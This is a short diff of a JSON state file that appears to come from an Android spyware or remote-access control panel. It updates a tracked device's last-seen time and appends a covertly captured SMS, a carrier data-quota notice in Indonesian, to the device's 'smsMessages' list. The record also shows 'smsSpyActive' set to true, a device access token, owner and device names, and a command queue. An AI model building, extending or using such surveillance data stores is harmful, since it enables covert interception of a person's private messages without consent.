@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775630712111,
+    "lastSeen": 1775630739107,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "XL",
+        "content": "(XL) Kuota Area Bebas Puas sudah habis. Beli paket Internet lainnya di outlet terdekat atau download aplikasi myXL. Info: xl.co.id/LC",
+        "time": "08/04 13:45",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1775630740102
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
